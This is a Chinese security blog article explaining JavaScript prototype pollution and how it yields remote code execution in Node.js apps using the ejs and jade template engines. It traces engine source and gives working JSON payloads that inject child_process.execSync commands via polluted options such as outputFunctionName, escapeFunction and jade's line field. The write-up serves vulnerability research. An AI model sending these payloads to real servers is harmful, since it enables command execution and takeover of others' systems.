> 原文链接: https://www.anquanke.com//post/id/236354 


# 关于nodejs的ejs和jade模板引擎的原型链污染挖掘


                                阅读量   
                                **88953**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t011089ec50e5a93be5.jpg)](https://p4.ssl.qhimg.com/t011089ec50e5a93be5.jpg)



## 原型链污染的原理

> 对于语句: `object[a][b] = value` 如果可以控制a, b, value的值, 将a设置为`__proto__`, 我们就可以给object对象的原型设置一个b属性, 值为value. 这样所有继承object对象原型的实例对象会在本身不拥有b属性的情况下, 都会拥有b属性, 且值为value.

例子

```
object_1 = `{`"a":"user", "b":"ricky"`}`;
object_1.__proto__.words = "nodejs is great!";
console.log(object_1.words)
object_2 = `{`"c":"user", "b":"ricky"`}`
console.log(object_2.words)
```

结果如下

[![](https://p2.ssl.qhimg.com/t0182c12ae4bada1e6d.png)](https://p2.ssl.qhimg.com/t0182c12ae4bada1e6d.png)

最终会输出两个 `nodejs is great`, 我们对 object_1 的原型对象设置了一个 words 属性，而 object_2 和 object_1 一样，都是继承了 Object.prototype , 而在获取 object_2.words 的时候, 由于 object_2 本身不具备 words 属性, 就会通过父类 Object.prototype 去寻找, 这就构造了原型链污染. 所以原型链污染简单来说就是如果能够控制并修改一个对象的原型, 就可以影响到所有和这个对象同一个原型的对象.

### <a class="reference-link" name="%E5%B8%B8%E7%94%A8%E6%B1%A1%E6%9F%93%E5%87%BD%E6%95%B0"></a>常用污染函数

常用的污染方式有 merge() 函数, clone() 内核, 还有 copy() 函数, 例如

```
function copy(object1, object2)`{`
    for (let key in object2) `{`
        if (key in object2 &amp;&amp; key in object1) `{`
            copy(object1[key], object2[key])
        `}` else `{`
            object1[key] = object2[key]
        `}`
    `}`
`}`

var user = new function()`{`
    this.userinfo = new function()`{`
        this.isVIP = false;
        this.isAdmin = false;
    `}`;
`}`

body=JSON.parse('`{`"__proto__":`{`"__proto__":`{`"query":"Ricky is admin!"`}``}``}`');
copy(user.userinfo,body);
console.log(user.userinfo);
console.log(user.query);
```

`user.query` 被赋值为 `Ricky is admin!`, 说明了我们污染成功, 使得user 去它的 `__proto__` 的 `__proto__` 里找 query 的变量

```
`{` isVIP: false, isAdmin: false `}`
Ricky is admin!
```

在JSON解析的情况下, `__proto__` 会被认为是一个真正的”键名”, 而不代表”原型”, 所以在遍历 `body` 的时候会存在这个键



## ejs 模板引擎 RCE

RCE的前提是需要有原型链污染, 例如一个简单的登录界面

```
router.post('/', require('body-parser').json(),function(req, res, next) `{`
  res.type('html');
  var user = new function()`{`
    this.userinfo = new function()`{`
    this.isVIP = false;
    this.isAdmin = false;    
    `}`;
  `}`;
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin)`{`
    return res.json(`{`ret_code: 0, ret_msg: 'login success!'`}`);  
  `}`else`{`
    return res.json(`{`ret_code: 2, ret_msg: 'login fail!'`}`);  
  `}`

`}`);
```

跟进 copy() 函数可以看到合并两个数组内容到第一个数组

```
function copy(object1, object2)`{`
    for (let key in object2) `{`
        if (key in object2 &amp;&amp; key in object1) `{`
            copy(object1[key], object2[key])
        `}` else `{`
            object1[key] = object2[key]
        `}`
    `}`
  `}`
```

那我们就有一个可以污染的口子, 在 app.js 里可以得知使用的是 ejs 模板引擎

```
app.engine('html', require('ejs').__express); 
app.set('view engine', 'html');
```

ejs 的 renderFile 进入

```
exports.renderFile = function () `{`
...
return tryHandleCache(opts, data, cb);
`}`;
```

跟进 tryHandleCache 函数, 发现一定会进入 handleCache 函数

[![](https://p5.ssl.qhimg.com/t01f8e9fb7fe3077a21.png)](https://p5.ssl.qhimg.com/t01f8e9fb7fe3077a21.png)

跟进 handleCache 函数

```
function handleCache(options, template) `{`
...
    func = exports.compile(template, options);
...
`}`
```

然后跟进 complie 函数, 会发现有大量的渲染拼接

[![](https://p3.ssl.qhimg.com/t0125788ae9473eea13.png)](https://p3.ssl.qhimg.com/t0125788ae9473eea13.png)

如果能够覆盖 `opts.outputFunctionName` , 这样我们构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE

```
prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
// After injection
prepended += ' var __tmp1; return global.process.mainModule.constructor._load('child_process').execSync('dir'); __tmp2 = __append;'
// 拼接了命令语句
```

在污染了原型链之后, 渲染直接变成了执行代码, 经过 return 体前返回, 即可 getshell, POC 如下

```
`{`"__proto__":`{`"__proto__":`{`"outputFunctionName":"a=1; return global.process.mainModule.constructor._load('child_process').execSync('dir'); //"`}``}``}`

`{`"__proto__":`{`"__proto__":`{`"outputFunctionName":"__tmp1; return global.process.mainModule.constructor._load('child_process').execSync('dir'); __tmp2"`}``}``}`
```

进行 copy 函数后, 此时 `outputFunctionName` 已经在全局变量中被复制了, 可以在 Global 的 `__proto__` 的 `__proto__` 的 `__proto__` 下找到我们的污染链

[![](https://p5.ssl.qhimg.com/t01e1a5a9690dcbd9c0.png)](https://p5.ssl.qhimg.com/t01e1a5a9690dcbd9c0.png)

再次刷新页面进行渲染时就会把我们写入的拼接, 执行我们输入的命令

[![](https://p0.ssl.qhimg.com/t011df793a3d7b33e5a.png)](https://p0.ssl.qhimg.com/t011df793a3d7b33e5a.png)

同样 ejs 模板还存在另一处 RCE

```
var escapeFn = opts.escapeFunction;
var ctor;
...
    if (opts.client) `{`
    src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
    if (opts.compileDebug) `{`
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
    `}`
`}`
```

伪造 `opts.escapeFunction` 也可以进行 RCE

```
`{`"__proto__":`{`"__proto__":`{`"client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load('child_process').execSync('dir');","compileDebug":true`}``}``}`

`{`"__proto__":`{`"__proto__":`{`"client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load('child_process').execSync('dir');","compileDebug":true,"debug":true`}``}``}`
```

可以看到 `escapeFunction` 已经在全局变量中被复制了

[![](https://p0.ssl.qhimg.com/t016df52775632233fa.png)](https://p0.ssl.qhimg.com/t016df52775632233fa.png)

再次刷新页面进行渲染时就会把我们写入的拼接, 执行我们输入的命令

[![](https://p5.ssl.qhimg.com/t0148129a20b655ec59.png)](https://p5.ssl.qhimg.com/t0148129a20b655ec59.png)

添加 `"debug":true` 污染时可以在调试时候看到自己赋值的命令

[![](https://p2.ssl.qhimg.com/t015a3ca87dcc394ff7.png)](https://p2.ssl.qhimg.com/t015a3ca87dcc394ff7.png)

**补充: **在 ejs 模板中还有三个可控的参数, 分别为 `opts.localsName` 和 `opts.destructuredLocals` 和 `opts.filename`, 但是这三个无法构建出合适的污染链

有一处调用 localsName, 污染会报错

```
fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
```

污染 destructuredLocals

```
if (opts.destructuredLocals &amp;&amp; opts.destructuredLocals.length) `{`
        var destructuring = '  var __locals = (' + opts.localsName + ' || `{``}`),\n';
        for (var i = 0; i &lt; opts.destructuredLocals.length; i++) `{`
          var name = opts.destructuredLocals[i];
          if (i &gt; 0) `{`
            destructuring += ',\n  ';
          `}`
          destructuring += name + ' = __locals.' + name;
        `}`
        prepended += destructuring + ';\n';
      `}`
```

作为数组不太好处理

污染 filename 被 `JSON.stringify` 进行转换了, 无法逃逸出来, 因此也无法污染函数代码

```
if (opts.compileDebug) `{`
  src = 'var __line = 1' + '\n'
    + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
    + '  , __filename = ' + (opts.filename ?
    JSON.stringify(opts.filename) : 'undefined') + ';' + '\n'
    + 'try `{`' + '\n'
    + this.source
    + '`}` catch (e) `{`' + '\n'
    + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
    + '`}`' + '\n';
`}`
```



## jade 模板引擎 RCE

原型链的污染思路和 ejs 思路很像, 从 `require('jade').__express` 进入 `jade/lib/index.js`

```
exports.__express = function(path, options, fn) `{`
  if(options.compileDebug == undefined &amp;&amp; process.env.NODE_ENV === 'production') `{`
    options.compileDebug = false;
  `}`
  exports.renderFile(path, options, fn);
`}`
```

跟进 renderFile 函数

```
exports.renderFile = function(path, options, fn)`{`
...
return handleTemplateCache(options)(options);
`}`;
```

返回的时候进入了 handleTemplateCache 函数, 跟进

[![](https://p2.ssl.qhimg.com/t01f2605d34c3a3060b.png)](https://p2.ssl.qhimg.com/t01f2605d34c3a3060b.png)

会进入 complie 方法, 跟进

[![](https://p0.ssl.qhimg.com/t01e5d2f1b65567903a.png)](https://p0.ssl.qhimg.com/t01e5d2f1b65567903a.png)

jade 模板和 ejs 不同, 在compile之前会有 parse 解析, 尝试控制传入 parse 的语句

[![](https://p5.ssl.qhimg.com/t01a28e9cfeb83faa26.png)](https://p5.ssl.qhimg.com/t01a28e9cfeb83faa26.png)

在 parse 函数中主要执行了这两步, 最后返回的部分

```
var body = ''
    + 'var buf = [];\n'
    + 'var jade_mixins = `{``}`;\n'
    + 'var jade_interp;\n'
    + (options.self
      ? 'var self = locals || `{``}`;\n' + js
      : addWith('locals || `{``}`', '\n' + js, globals)) + ';'
    + 'return buf.join("");';
  return `{`body: body, dependencies: parser.dependencies`}`;
```

`options.self` 可控, 可以绕过 `addWith` 函数, 回头跟进 compile 函数, 看看作用

[![](https://p4.ssl.qhimg.com/t01304fc151335c9d1d.png)](https://p4.ssl.qhimg.com/t01304fc151335c9d1d.png)

返回的是 buf, 跟进 visit 函数

[![](https://p1.ssl.qhimg.com/t01f6e2972a72bf8681.png)](https://p1.ssl.qhimg.com/t01f6e2972a72bf8681.png)

如果 debug 为 true, `node.line` 就会被 push 进去, 造成拼接 (两个参数)

```
jade_debug.unshift(new jade.DebugItem( 0, "" ));return global.process.mainModule.constructor._load('child_process').execSync('dir');//
// 注释符注释掉后面的语句
```

在返回的时候还会经过 visitNode 函数

```
visitNode: function(node)`{`
    return this['visit' + node.type](node);`}`
```

经过测试 visit 开头的函数, 结果如下

```
visitAttributes
visitBlock
visitBlockComment √
visitCase
visitCode √
visitComment √
visitDoctype √
visitEach
visitFilter
visitMixin
visitMixinBlock √
visitNode
visitLiteral
visitText
visitTag
visitWhen
```

然后就可以返回 buf 部分进行命令执行

```
`{`"__proto__":`{`"__proto__": `{`"type":"Code","compileDebug":true,"self":true,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('dir');//"`}``}``}`
```

原型链污染成功

[![](https://p3.ssl.qhimg.com/t018c3914e1545c44a2.png)](https://p3.ssl.qhimg.com/t018c3914e1545c44a2.png)

**补充: **针对 jade RCE链的污染, 普通的模板可以只需要污染 self 和 line, 但是有继承的模板还需要污染 type



## 小结

关于 ejs 和 jade 模板的语句拼接, 官方承认不是一个漏洞, 原型链的危害很大, 但是原型链污染攻击有个弊端，就是一旦污染了原型链，除非整个程序重启，否则所有的对象都会被污染与影响!

写了个简单的 POC 生成脚本, 直接生成两个模板引擎的 POC, 上传到了[github](https://github.com/Ricky-369369/Ricky.github.io/blob/main/nodejs/nodejs.py)

感谢各位读者可以耐心地读到这里, 希望您对原型链污染有了更深刻的认识, 可能还有遗漏的, 希望各位师傅踊跃提出!
